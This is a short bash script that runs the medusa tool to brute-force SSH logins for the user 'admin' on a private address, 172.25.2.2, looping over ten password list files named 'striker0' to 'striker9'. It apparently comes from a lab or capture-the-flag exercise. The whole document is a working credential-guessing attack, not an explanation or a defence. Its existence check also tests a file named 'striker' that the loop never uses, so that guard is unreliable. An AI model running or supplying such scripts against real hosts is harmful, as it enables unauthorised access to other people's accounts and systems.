#!/bin/bash

password_list="striker"

if [ -e "$password_list" ];
then
	for i in {0..9}
	do
		medusa -h 172.25.2.2 -u "admin" -P "$password_list$i" -M ssh
	done
else
	echo "Error: File $password_list does not exist!"

fi
